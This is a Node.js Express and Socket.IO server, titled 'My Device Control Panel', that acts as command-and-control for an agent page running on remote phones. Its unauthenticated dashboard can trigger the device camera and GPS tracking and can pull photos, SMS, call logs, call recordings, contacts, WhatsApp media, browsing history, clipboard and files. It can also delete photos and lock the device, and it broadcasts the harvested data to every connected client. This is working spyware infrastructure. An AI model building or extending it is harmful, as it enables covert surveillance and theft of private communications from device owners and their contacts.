const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 100 * 1024 * 1024,
  pingTimeout: 60000,
  pingInterval: 25000
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

// In-memory device store
const devices = new Map();
const deviceSockets = new Map();

// API: List all registered devices
app.get('/api/devices', (req, res) => {
  const list = [];
  for (const [id, device] of devices) {
    list.push({ id, ...device, online: deviceSockets.has(id) });
  }
  res.json(list);
});

// API: Get single device info
app.get('/api/devices/:id', (req, res) => {
  const device = devices.get(req.params.id);
  if (!device) return res.status(404).json({ error: 'Device not found' });
  res.json({ id: req.params.id, ...device, online: deviceSockets.has(req.params.id) });
});

// Serve agent page
app.get('/agent', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'agent', 'index.html'));
});

// Serve agent.js
app.get('/agent/agent.js', (req, res) => {
  res.sendFile(path.join(__dirname, '..', 'agent', 'agent.js'));
});

// Fallback to index.html for SPA routing (skip static file extensions)
app.get('*', (req, res) => {
  if (!req.path.startsWith('/api') && !req.path.startsWith('/socket.io') &&
      !/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot|map|json)$/i.test(req.path)) {
    res.sendFile(path.join(__dirname, '..', 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Not found' });
  }
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[Socket] Connected: ${socket.id}`);

  // Device agent registers itself
  socket.on('device:register', (data) => {
    const deviceId = data.deviceId || uuidv4();
    const deviceInfo = {
      name: data.name || 'Unknown Device',
      type: data.type || 'unknown',
      platform: data.platform || 'unknown',
      browser: data.browser || 'unknown',
      screenWidth: data.screenWidth || 0,
      screenHeight: data.screenHeight || 0,
      battery: data.battery || null,
      network: data.network || null,
      storage: data.storage || null,
      registeredAt: new Date().toISOString(),
      lastSeen: new Date().toISOString()
    };

    devices.set(deviceId, deviceInfo);
    deviceSockets.set(deviceId, socket.id);
    socket.deviceId = deviceId;

    socket.emit('device:registered', { deviceId });
    io.emit('devices:updated');
    console.log(`[Device] Registered: ${deviceId} (${deviceInfo.name})`);
  });

  // Device sends updated info
  socket.on('device:update', (data) => {
    if (socket.deviceId && devices.has(socket.deviceId)) {
      const existing = devices.get(socket.deviceId);
      devices.set(socket.deviceId, {
        ...existing,
        ...data,
        lastSeen: new Date().toISOString()
      });
      io.emit('devices:updated');
    }
  });

  // Dashboard requests camera from device
  socket.on('command:camera:start', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:start');
    }
  });

  socket.on('command:camera:stop', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:stop');
    }
  });

  socket.on('command:camera:switch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:switch');
    }
  });

  socket.on('command:camera:capture', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:camera:capture');
    }
  });

  // Device sends camera frame
  socket.on('camera:frame', (data) => {
    socket.broadcast.emit('camera:frame', {
      deviceId: socket.deviceId,
      frame: data.frame
    });
  });

  // Device sends captured photo
  socket.on('camera:captured', (data) => {
    socket.broadcast.emit('camera:captured', {
      deviceId: socket.deviceId,
      image: data.image
    });
  });

  // Dashboard requests GPS from device
  socket.on('command:gps:start', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gps:start');
    }
  });

  socket.on('command:gps:stop', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gps:stop');
    }
  });

  // Device sends GPS location
  socket.on('gps:location', (data) => {
    socket.broadcast.emit('gps:location', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests gallery/photos from device
  socket.on('command:gallery:scan', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gallery:scan');
    }
  });

  // Device sends gallery photos list
  socket.on('gallery:photos', (data) => {
    socket.broadcast.emit('gallery:photos', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests full-size photo
  socket.on('command:gallery:get', ({ deviceId, photoId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:gallery:get', { photoId });
    }
  });

  // Device sends full-size photo
  socket.on('gallery:photo', (data) => {
    socket.broadcast.emit('gallery:photo', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests call log
  socket.on('command:calllog:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:calllog:fetch');
    }
  });

  // Device sends call log
  socket.on('calllog:data', (data) => {
    socket.broadcast.emit('calllog:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests SMS
  socket.on('command:sms:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:sms:fetch');
    }
  });

  // Device sends SMS data
  socket.on('sms:data', (data) => {
    socket.broadcast.emit('sms:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests browsing history
  socket.on('command:history:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:history:fetch');
    }
  });

  // Device sends history data
  socket.on('history:data', (data) => {
    socket.broadcast.emit('history:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Device sends real-time notification (call/sms)
  socket.on('notification:new', (data) => {
    socket.broadcast.emit('notification:new', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests file listing
  socket.on('command:files:list', ({ deviceId, path: dirPath }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:files:list', { path: dirPath || '/' });
    }
  });

  // Device sends file listing
  socket.on('files:list', (data) => {
    socket.broadcast.emit('files:list', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests file download
  socket.on('command:files:download', ({ deviceId, filePath }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:files:download', { filePath });
    }
  });

  // Device sends file content
  socket.on('files:content', (data) => {
    socket.broadcast.emit('files:content', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests notifications history
  socket.on('command:notifications:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:notifications:fetch');
    }
  });

  // Device sends notifications data
  socket.on('notifications:data', (data) => {
    socket.broadcast.emit('notifications:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests WhatsApp media
  socket.on('command:whatsapp:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:whatsapp:fetch');
    }
  });

  // Device sends WhatsApp data
  socket.on('whatsapp:data', (data) => {
    socket.broadcast.emit('whatsapp:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests photo delete
  socket.on('command:photo:delete', ({ deviceId, photoId, path }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:photo:delete', { photoId, path });
    }
  });

  // Device confirms photo deleted
  socket.on('photo:deleted', (data) => {
    socket.broadcast.emit('photo:deleted', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests call recordings
  socket.on('command:recordings:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:recordings:fetch');
    }
  });

  // Device sends recordings list
  socket.on('recordings:data', (data) => {
    socket.broadcast.emit('recordings:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Device sends new recording in real-time
  socket.on('recording:new', (data) => {
    socket.broadcast.emit('recording:new', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Dashboard requests contacts
  socket.on('command:contacts:fetch', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:contacts:fetch');
    }
  });

  // Device sends contacts
  socket.on('contacts:data', (data) => {
    socket.broadcast.emit('contacts:data', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Live call events (real-time incoming/outgoing/missed)
  socket.on('call:live', (data) => {
    socket.broadcast.emit('call:live', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Call log deletion detected
  socket.on('calllog:deleted', (data) => {
    socket.broadcast.emit('calllog:deleted', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Emergency commands
  socket.on('command:emergency:alarm', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:emergency:alarm');
    }
  });

  socket.on('command:emergency:lock', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:emergency:lock');
    }
  });

  socket.on('command:emergency:message', ({ deviceId, message }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:emergency:message', { message });
    }
  });

  // Clipboard
  socket.on('command:clipboard:get', ({ deviceId }) => {
    const targetSocketId = deviceSockets.get(deviceId);
    if (targetSocketId) {
      io.to(targetSocketId).emit('command:clipboard:get');
    }
  });

  socket.on('clipboard:content', (data) => {
    socket.broadcast.emit('clipboard:content', {
      deviceId: socket.deviceId,
      ...data
    });
  });

  // Disconnect
  socket.on('disconnect', () => {
    if (socket.deviceId) {
      deviceSockets.delete(socket.deviceId);
      if (devices.has(socket.deviceId)) {
        const device = devices.get(socket.deviceId);
        device.lastSeen = new Date().toISOString();
        devices.set(socket.deviceId, device);
      }
      io.emit('devices:updated');
      console.log(`[Device] Disconnected: ${socket.deviceId}`);
    }
    console.log(`[Socket] Disconnected: ${socket.id}`);
  });
});

// Start server (skip in Vercel serverless environment)
if (!process.env.VERCEL) {
  const PORT = process.env.PORT || 3000;
  server.listen(PORT, () => {
    console.log(`\n🖥️  My Device Control Panel`);
    console.log(`📡 Server running on http://localhost:${PORT}`);
    console.log(`📱 Agent page: http://localhost:${PORT}/agent`);
    console.log(`🌐 Dashboard: http://localhost:${PORT}\n`);
  });
}

module.exports = app;
